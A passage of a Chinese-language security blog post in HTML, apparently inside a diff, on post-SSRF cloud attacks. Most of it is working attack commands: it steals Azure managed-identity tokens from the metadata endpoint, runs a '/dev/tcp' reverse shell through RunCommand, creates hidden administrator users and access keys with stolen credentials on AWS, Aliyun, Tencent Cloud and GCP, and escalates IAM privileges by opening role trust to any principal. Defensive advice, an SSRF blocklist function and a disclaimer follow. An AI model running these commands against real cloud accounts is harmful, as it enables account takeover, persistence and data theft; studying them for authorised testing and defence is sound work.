class="variable">$API</span>&amp;format=text&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Managed Identity Token</span></span><br><span class="line">curl -s -H <span class="string">&quot;<span class="variable">$H</span>&quot;</span> <span class="string">&quot;http://169.254.169.254/metadata/identity/oauth2/token?<span class="variable">$API</span>&amp;resource=https://management.azure.com/&quot;</span></span><br><span class="line"><span class="comment"># 返回: &#123; &quot;access_token&quot;: &quot;eyJ0eXAi...&quot;, &quot;expires_in&quot;: &quot;86399&quot; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 Token 枚举订阅 + 远程执行命令 (RunCommand)</span></span><br><span class="line">AT=<span class="string">&quot;&lt;access_token&gt;&quot;</span></span><br><span class="line">curl -H <span class="string">&quot;Authorization: Bearer <span class="variable">$AT</span>&quot;</span> <span class="string">&quot;https://management.azure.com/subscriptions?api-version=2021-04-01&quot;</span></span><br><span class="line">curl -X POST -H <span class="string">&quot;Authorization: Bearer <span class="variable">$AT</span>&quot;</span> -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://management.azure.com/subscriptions/&lt;sub&gt;/resourceGroups/&lt;rg&gt;/providers/Microsoft.Compute/virtualMachines/&lt;vm&gt;/runCommand?api-version=2021-07-01&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;commandId&quot;:&quot;RunShellScript&quot;,&quot;script&quot;:[&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;]&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、STS-凭证持久化"><a href="#六、STS-凭证持久化" class="headerlink" title="六、STS 凭证持久化"></a>六、STS 凭证持久化</h2><p>临时凭证 1-6 小时过期，必须快速创建永久后门。</p>
+<p><strong>AWS：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-caller-identity --profile stolen</span><br><span class="line">aws iam create-user --user-name system-monitor --profile stolen</span><br><span class="line">aws iam create-access-key --user-name system-monitor --profile stolen</span><br><span class="line">aws iam attach-user-policy --user-name system-monitor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --profile stolen</span><br></pre></td></tr></table></figure>
+
+<p><strong>阿里云：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aliyun ram CreateUser --UserName system-monitor --DisplayName <span class="string">&quot;Monitor&quot;</span> --profile stolen</span><br><span class="line">aliyun ram CreateAccessKey --UserName system-monitor --profile stolen</span><br><span class="line">aliyun ram AttachPolicyToUser --UserName system-monitor --PolicyType System --PolicyName AdministratorAccess --profile stolen</span><br></pre></td></tr></table></figure>
+
+<p><strong>腾讯云：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tccli cam AddUser --Name system-monitor --Remark <span class="string">&quot;Monitor&quot;</span></span><br><span class="line">tccli cam CreateAccessKey --TargetUin &lt;uin&gt;</span><br><span class="line">tccli cam AttachUserPolicy --AttachPolicyId &lt;admin-policy-id&gt; --AttachUin &lt;uin&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>GCP（创建 Service Account 密钥持久化）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Authorization: Bearer &lt;token&gt;&quot;</span> \</span><br><span class="line">  <span class="string">&quot;https://iam.googleapis.com/v1/projects/&lt;project&gt;/serviceAccounts/&lt;sa&gt;/keys&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="七、IAM-角色提权"><a href="#七、IAM-角色提权" class="headerlink" title="七、IAM 角色提权"></a>七、IAM 角色提权</h2><p><strong>PassRole 传递高权限角色：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws lambda create-function --function-name backdoor --runtime python3.9 \</span><br><span class="line">  --role arn:aws:iam::&lt;acc&gt;:role/admin-role --handler index.handler --zip-file fileb://func.zip --profile stolen</span><br></pre></td></tr></table></figure>
+
+<p><strong>CreatePolicy + AttachRolePolicy 自提权：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam create-policy --policy-name stealth --profile stolen \</span><br><span class="line">  --policy-document <span class="string">&#x27;&#123;&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[&#123;&quot;Effect&quot;:&quot;Allow&quot;,&quot;Action&quot;:&quot;*&quot;,&quot;Resource&quot;:&quot;*&quot;&#125;]&#125;&#x27;</span></span><br><span class="line">aws iam attach-role-policy --role-name &lt;current-role&gt; --policy-arn &lt;arn&gt; --profile stolen</span><br></pre></td></tr></table></figure>
+
+<p><strong>UpdateAssumeRolePolicy 信任外部：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aws iam update-assume-role-policy --role-name target-role --profile stolen \</span><br><span class="line">  --policy-document <span class="string">&#x27;&#123;&quot;Version&quot;:&quot;2012-10-17&quot;,&quot;Statement&quot;:[&#123;&quot;Effect&quot;:&quot;Allow&quot;,&quot;Principal&quot;:&#123;&quot;AWS&quot;:&quot;*&quot;&#125;,&quot;Action&quot;:&quot;sts:AssumeRole&quot;&#125;]&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 扮演: aws sts assume-role --role-arn arn:aws:iam::&lt;target&gt;:role/target-role --role-session-name evil</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="八、控制台访问生成"><a href="#八、控制台访问生成" class="headerlink" title="八、控制台访问生成"></a>八、控制台访问生成</h2><p><strong>AWS 联合登录：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws sts get-federation-token --name console --duration-seconds 43200 --profile stolen</span><br><span class="line"><span class="comment"># https://signin.aws.amazon.com/federation?Action=login&amp;Issuer=example&amp;Destination=https://console.aws.amazon.com/&amp;SigninToken=&lt;token&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>阿里云控制台：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aliyun ram CreateLoginProfile --UserName system-monitor --Password <span class="string">&#x27;ComplexP@ssw0rd!&#x27;</span> --PasswordResetRequired <span class="literal">false</span> --profile stolen</span><br><span class="line"><span class="comment"># https://signin.aliyun.com/&lt;account-id&gt;.onaliyun.com/login.htm</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>GCP：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcloud auth activate-service-account --access-token-file=&lt;(<span class="built_in">echo</span> <span class="string">&quot;&lt;token&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="九、防御建议"><a href="#九、防御建议" class="headerlink" title="九、防御建议"></a>九、防御建议</h2><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><ol>
+<li><strong>URL 白名单</strong> — 禁止内网、链路本地地址</li>
+<li><strong>禁用危险协议</strong> — file:&#x2F;&#x2F;、gopher:&#x2F;&#x2F;、dict:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;</li>
+<li><strong>DNS 二次校验</strong> — 解析后复检 IP，防御 DNS Rebinding</li>
+<li><strong>禁止回显</strong> — 不将远端响应直接返回用户</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, ipaddress</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">BLOCKED = [ipaddress.ip_network(n) <span class="keyword">for</span> n <span class="keyword">in</span> [</span><br><span class="line">    <span class="string">&quot;169.254.0.0/16&quot;</span>, <span class="string">&quot;100.100.100.200/32&quot;</span>, <span class="string">&quot;10.0.0.0/8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;172.16.0.0/12&quot;</span>, <span class="string">&quot;192.168.0.0/16&quot;</span>, <span class="string">&quot;127.0.0.0/8&quot;</span></span><br><span class="line">]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_url</span>(<span class="params">url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    p = urlparse(url)</span><br><span class="line">    <span class="keyword">if</span> p.scheme <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>): <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ip = ipaddress.ip_address(socket.gethostbyname(p.hostname))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">any</span>(ip <span class="keyword">in</span> net <span class="keyword">for</span> net <span class="keyword">in</span> BLOCKED)</span><br></pre></td></tr></table></figure>
+
+<h3 id="云平台层"><a href="#云平台层" class="headerlink" title="云平台层"></a>云平台层</h3><table>
+<thead>
+<tr>
+<th>平台</th>
+<th>关键防御措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AWS</strong></td>
+<td>强制 IMDSv2 (<code>HttpTokens: required</code>)；SCP 禁止 <code>iam:PassRole</code>；CloudTrail 监控敏感 API</td>
+</tr>
+<tr>
+<td><strong>阿里云</strong></td>
+<td>安全组限制 100.100.100.200 出站；RAM 最小权限；禁用非必要实例 RAM 角色</td>
+</tr>
+<tr>
+<td><strong>腾讯云</strong></td>
+<td>安全组限制 metadata.tencentyun.com &#x2F; 169.254.0.23 出站；CAM 最小权限</td>
+</tr>
+<tr>
+<td><strong>GCP</strong></td>
+<td>VPC Service Controls；禁用默认服务帐号广泛权限；Access Transparency</td>
+</tr>
+<tr>
+<td><strong>Azure</strong></td>
+<td>Managed Identity 替代密钥；Azure Policy 限制特权角色；Private Link</td>
+</tr>
+</tbody></table>
+<h3 id="监控要点"><a href="#监控要点" class="headerlink" title="监控要点"></a>监控要点</h3><ul>
+<li>元数据端点高频访问（异常速率）</li>
+<li>同一凭证短时间跨多服务调用</li>
+<li>非预期地域 API 请求</li>
+<li><code>CreateUser</code> &#x2F; <code>CreateAccessKey</code> &#x2F; <code>AttachRolePolicy</code> &#x2F; <code>UpdateAssumeRolePolicy</code></li>
+</ul>
+<hr>
+<h2 id="十、免责声明"><a href="#十、免责声明" class="headerlink" title="十、免责声明"></a>十、免责声明</h2><p><strong>本文仅供安全研究与授权测试使用。</strong> 文中技术仅适用于已获系统所有者书面授权的渗透测试、自有云环境安全评估及安全教育培训。任何未经授权的渗透测试、凭证窃取、资源接管均属违法行为。作者不对读者滥用本文技术造成的任何损失承担责任。使用前请确保遵守所在国家&#x2F;地区法律法规及目标平台的可接受使用政策。</p>
+<hr>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">AWS EC2 Instance Metadata</a></li>
+<li><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/49122.html">阿里云 ECS 实例元数据</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/document/product/213/4934">腾讯云 实例元数据</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.google.com/compute/docs/metadata">GCP Instance Metadata</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service">Azure IMDS</a></li>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">HackTricks — SSRF</a></li>
+<li><a target="_blank" rel="noopener" href="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP SSRF Prevention Cheat Sheet</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" rel="tag"># 云安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/SSRF-basics-exploitation/" rel="prev" title="SSRF基础原理与常见利用">
+                  <i class="fa fa-angle-left"></i> SSRF基础原理与常见利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Mobile-Android-pentest-basics/" rel="next" title="移动安全：Android APP 渗透测试基础">
+                  移动安全：Android APP 渗透测试基础 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
